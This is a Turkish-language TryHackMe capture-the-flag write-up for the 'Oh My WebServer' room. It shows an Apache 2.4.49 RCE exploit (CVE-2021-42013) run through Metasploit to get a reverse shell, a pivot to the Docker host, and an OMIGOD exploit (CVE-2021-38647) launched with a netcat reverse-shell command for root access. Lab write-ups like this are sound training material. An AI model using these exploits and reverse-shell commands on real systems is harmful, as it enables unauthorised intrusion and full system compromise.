---
title: 'TryHackMe | Oh My WebServer WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [remote code execution]
render_with_liquid: false

## Özet

Oh My WebServer, Path Traversal zafiyetine sahip bir web uygulamasıdır. Bu zafiyeti Remote Code Execution zafiyetine dönüştürecek bir araçtan yararlanarak sistemden shell elde edeceğiz. Sonrada aynı ağ içerisinde başka bir cihazın daha olduğunu öğrenecek ve cihazın üzerinde çalışan zafiyetli bir porttan yararlanarak sistemden tam yetkili olarak bir bağlantı alacağız.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.247.179
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80 numaralı portun incelenmesi

Tarama sonucunda 80 portu üzerinde Apache httpd'nin 2.4.49 sürümünün çalıştığını gördüm. Bu sürüm üzerinde bir `Remote Code Execution` zafiyeti bulunuyor. Bu zafiyeti sömürmek için bir metasploitte bir exploit bulunuyor.

## Sömürü aşaması

```console
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> run
[*] Started reverse TCP handler on 10.21.66.61:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://10.10.247.179:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://10.10.247.179:80 - Attempt to exploit for CVE-2021-42013
[*] http://10.10.247.179:80 - Sending linux/x64/meterpreter/reverse_tcp command payload
[*] Sending stage (3045380 bytes) to 10.10.247.179
[*] Meterpreter session 1 opened (10.21.66.61:4444 -> 10.10.247.179:49630) at 2025-03-29 17:16:48 -0400
[!] This exploit may require manual cleanup of '/tmp/qKPGzNTp' on the target

(Meterpreter 1)(/bin) >
```

Modülü seçtikten sonra gerekli bilgileri doldurdum, exploiti çalıştırdım ve sistemden bir shell elde ettim.

## Yetki yükseltme

### root

`sysinfo` komutunu kullandıktan sonra sisteme atanan IP adresinin `172.17.0.2` olduğunu öğreniyorum.

```console
(Meterpreter 1)(/home) > sysinfo
Computer     : 172.17.0.2
OS           : Debian 10.10 (Linux 5.4.0-88-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

IP adresleri rastgele atılmadığından `172.17.0.1` adresinde de bir makine olduğunu düşündüm. Bu makinenin portlarını tespit etmek için bir port tarama aracına ihtiyacımız var. [Bu](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) adresten nmap'in derlenmiş halini indirip, karşı sisteme yüklüyorum.

```console
(Meterpreter 1)(/tmp) > upload nmap
[*] Uploading  : /home/appdone/nmap -> nmap
[*] Uploaded -1.00 B of 5.67 MiB (0.0%): /home/appdone/nmap -> nmap
[*] Completed  : /home/appdone/nmap -> nmap
```

Daha sonra tüm portları taramasını istediğimde aşağıdaki portları tespit etti.

```console
./nmap 172.17.0.1 -p-
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up (0.00034s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
```

Nmap sorun çıkardığından portların versiyonlarını görüntüleyemiyorum. Bunun yerine 5986 numaralı portu internette arattım ve [bu](https://github.com/AlteredSecurity/CVE-2021-38647) exploiti buldum. İndirdikten sonra çalıştırıp root haklarında bağlantıyı elde ediyoruz.

```console
python3 exploit.py
usage: exploit.py [-h] -t TARGETIP [-p TARGETPORT] [-c COMMAND] [-s SCRIPT]
exploit.py: error: the following arguments are required: -t/--TargetIP
python3 exploit.py -t 172.17.0.1 -p 5986 -c "busybox nc 10.21.66.61 1234 -e /bin/bash"
```

Bağlantıyı aldıktan sonra ise geriye sadece root.txt ve user.txt dosyalarından bayrakları almak kalıyor.

```console
cd /root
ls
root.txt
snap
cat root.txt
THM{7f14****011f}
find / -name user.txt 2>/dev/null
id
/var/lib/docker/overlay2/7bd13e3daf4d9139aff4d20f9dedfc340318dd7d2fc5cc6569f3db831a67ccee/merged/root/user.txt
/var/lib/docker/overlay2/b7c08e7595ad459eca41aeafc79338b5c809c1aec3296cff0263882f60a87b7e/diff/root/user.txt
uid=0(root) gid=0(root) groups=0(root)
cat /var/lib/docker/overlay2/b7c08e7595ad459eca41aeafc79338b5c809c1aec3296cff0263882f60a87b7e/diff/root/user.txt
THM{eacf***7ac1}
```
